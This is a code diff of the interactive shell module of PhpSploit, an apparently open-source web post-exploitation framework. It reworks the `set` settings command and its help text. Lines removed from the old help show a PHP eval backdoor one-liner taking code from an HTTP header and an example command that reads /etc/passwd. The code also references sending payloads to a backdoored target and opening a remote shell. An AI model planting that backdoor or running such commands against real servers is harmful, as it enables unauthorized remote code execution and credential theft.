@@ -5,7 +5,7 @@ provides interactive use of commands.
 """
 import os, difflib
 
-import core, cmdshell, session
+import core, cmdshell, session, ui.input
 
 from datatypes import Path, PhpCode
 from ui.color import colorize, decolorize
@@ -95,7 +95,7 @@ class Cmd(cmdshell.Cmd):
                  "Then, use `set TARGET <BACKDOORED_URL>` and run `exploit`.")
             return print( colorize("%BoldCyan", m) )
 
-        print( "[*] Sending payload to «{}» ...".format(session.Conf.TARGET) )
+        print("[*] Sending payload to «{}» ...".format(session.Conf.TARGET))
         socket = tunnel.Init() # it raises exception if fails
         remoteShell = ui.shell.Remote()      # start remote shell instance
         remoteShell.cmdqueue = self.cmdqueue # send current command queue
@@ -224,7 +224,7 @@ class Cmd(cmdshell.Cmd):
 
         # run command help on any error
         except:
-            return self.addcmd("help session")
+            return self.interpret("help session")
 
 
     #####################
@@ -266,7 +266,7 @@ class Cmd(cmdshell.Cmd):
         """
         # only one argument must be supplied
         if len(argv) != 2:
-            return self.addcmd('help lcd')
+            return self.interpret('help lcd')
 
         # expand user special path notation "~"
         newDir = os.path.expanduser( argv[1] )
@@ -293,10 +293,10 @@ class Cmd(cmdshell.Cmd):
               - Run the given script file's content, line by line
         """
         if len(argv) != 2:
-            return self.addcmd("help source")
+            return self.interpret("help source")
 
         try:
-            self.addcmd( open(argv[1], 'r').read() )
+            self.interpret( open(argv[1], 'r').read() )
         except OSError as e:
             return "«{}»".format(e.filename), e.strerror
 
@@ -316,114 +316,85 @@ class Cmd(cmdshell.Cmd):
         """View and edit settings
 
         SYNOPSIS:
-            set [<NAME> ["<VALUE>"]]
+            set [<NAME> [+] ["<VALUE>"]]
 
         DESCRIPTION:
-            The PhpSploit settings are declared at start by their
-            default values. The user configuration overwrite them for
-            customisation purposes.
-            The 'set' command handles settings from the framework
-            interface.
-            - Called with no argument, the whole settings list will be
-              displayed.
-            - A single argument displays the list of settings whose
-              name start with it.
-            - Two arguments are used to change the value of a setting,
-              considering the first one as the setting to be changed;
-              and the second as the new setting value.
+            PhpSploit configuration settings manager.
+            The settings are a collection of core variables that affect
+            the framework's core behavior. Any setting take a default
+            value, that can be manually modified.
+
+            > set
+            - Display all current settings
+
+            > set <STRING>
+            - Display all settings whose name starts with STRING.
+
+            > set <NAME> "value"
+            - Change the NAME setting to "value". If the value is not valid,
+            no changes are made.
+
+            > set <NAME> "file:///path/to/file"
+            - Set NAME setting's value into a RandLine buffer whose value
+            binds to the external file "/path/to/file". It means that the
+            setting's effective value is dynamic, and on each call to it,
+            the file's content will be loaded if available, and the
+            value is a random line from the file/buffer.
+
+            > set <NAME> +
+            - Open the setting value for edition as a multiline buffer
+            with TEXTEDITOR. The buffer can then be edited, and once saved,
+            the setting will take the buffer's value, except if there are
+            no valid lines.
+
+            > set <NAME> + "value"
+            - Add "value" as a setting possible choice. If converts the
+            current setting into a RandLine buffer if it was not.
+
+            > set <NAME> + "file:///path/to/file"
+            - Rebind NAME setting to the given file path, even if it does
+            not exist at the moiment it had been set. It means that each
+            time the setting's value is called, a try is made to load the
+            file's content as new buffer if it exists/is valid, and
+            keeps the old one otherwise.
+
+
+        BEHAVIOR
+            - Settings are pre declared at start. It means that new ones
+            cannot be declared.
+
+            - The convention above does not apply for settings whose name
+            start with "HTTP_", because this kind of variable are
+            automatically used as custom headers on http requests. For
+            example, `set HTTP_ACCEPT_LANGUAGE "en-CA"` will set the
+            "Accept-Language" http header to the specified value.
 
             NOTE: The 'set' operating scope is limited to the current
             PhpSploit session. It means that persistant settings value
             changes must be defined by the hand in the user
             configuration file.
-
-
-        WARNING:
-            Considering the PhpSploit's input parser, commands which
-            contain quotes, semicolons, and other chars that could be
-            interpreted by the framework MUST be enquoted to be
-            interpreted as a single argument. For example:
-              > run echo 'foo bar' > /tmp/foobar; cat /etc/passwd
-            In this case, quotes and semicolons will be interpreted by
-            the framwework, so the correct syntax is:
-              > run "echo 'foo bar' > /tmp/foobar; cat /etc/passwd"
-
-        EXAMPLES:
-            > set REQ_
-              - Display all settings whose name begins with "REQ_"
-            > set TEXTEDITOR
-              - Show the current value of the TEXTEDITOR setting
-            > set TEXTEDITOR /usr/bin/vim
-              - Set "/usr/bin/vim" as TEXTEDITOR value (<3 vim)
-            > set BACKDOOR "<?php @eval($_SERVER['HTTP_%%PASSKEY%%']);?>"
-              - Set BACKDOOR's new value, in this case, the string
-                to use as value contained quotes and semicolons,
-                which are interpreted by the interface, like in bash.
-                For that reason the value MUST BE correctly enquoted.
         """
-        def set_var(var, val):
-            """(try to) change the value to "val" of the "var" setting"""
-            # use backup and set new value
-            backup = self.CNF['SET'][var]
-            self.CNF['SET'][var] = val
-            from usr.settings import comply
+        # `set [<PATTERN>]` display concerned settings list
+        if len(argv) < 3:
+            print(session.Conf( (argv+[""])[1] ))
 
-            # if the new value is syntaxically accepted by settings lib:
-            if comply(self.CNF['SET']):
+        # buffer edit mode
+        elif argv[2] == "+":
+            # `set <VAR> +`: use TEXTEDITOR as buffer viewer in file mode
+            if len(argv) == 3:
+                # get a buffer obj from setting's raw buffer value
+                buffer = ui.input.Buffer( session.Conf[argv[1]].buffer )
+                # try to edit it through TEXTEDITOR, and update it
+                # if it has been modified.
+                if buffer.edit():
+                    session.Conf[argv[1]] = buffer
 
-                # the LNK object must be backed up and updated before
-                # possible on the fly TARGET url modification.
-                lnk_backup = self.CNF['LNK']
-                self.CNF['LNK'] = update_opener(self.CNF)
+            # `set <VAR> + "value"`: add value on setting possible choices
+            session.Conf[argv[1]] += " ".join(argv[3:])
 
-                # Changing TARGET on the fly, during a remote shell session
-                # implies that a payload link must be estabilished with the
-                # new value, and the new TARGET signature compared to the old.
-                if var == 'TARGET' and self.shell_name == 'remote':
-                    import network.server
-                    if network.server.Link(self.CNF).check():
-                        self.CNF['LNK_HASH'] = self.CNF['LNK']['HASH']
-                        self.set_prompt()
-                    else:
-                        self.CNF['LNK'] = lnk_backup
-                        self.CNF['SET'][var] = backup
-
-                # on normal scenarios, just display the new value,
-                # which indicates a successfull operation.
-                else:
-                    showVal = color(1) + self.CNF['SET'][var] + color(0)
-                    print( var + " ==> " + showVal )
-
-            # incorrect syntax juste resets the value to backup
-            else:
-                self.CNF['SET'][var] = backup
-
-        # Display settings list
-        if len(argv) <= 2:
-            # list settings matching argv[1]
-            patern = argv[1].upper() if len(argv) > 1 else ''
-            title = "Session settings"
-            items = self.CNF['SET'].items()
-            elems = [(x.upper(),y) for x,y in items if x.startswith(patern)]
-            # an empty array implies that the given argument was
-            # wrong, then display the help message instead
-            if elems:
-                columnize_vars(title, dict(elems)).write()
-            else:
-                self.run('help set')
-
-        # Change the specified setting
+        # `set <VAR> "value"`: just change VAR's "value"
         else:
-            setting = argv[1].upper()
-            if setting in self.CNF['SET']:
-                if setting in self.locked_settings:
-                    print( P_err+'Locked session setting: '+setting )
-                else:
-                    value = ' '.join( argv[2:] ).strip()
-                    set_var(setting, value)
-            else:
-                self.run('help set')
-
+            session.Conf[argv[1]] = argv[2]
 
 
     #####################
@@ -454,7 +425,7 @@ class Cmd(cmdshell.Cmd):
         """
         # If more than 1 argument, help to help !
         if len(argv) > 2:
-            return( self.run('help help') )
+            return self.interpret('help help')
 
         # collect the command list from current shell
         sys_commands = self.get_commands(self)
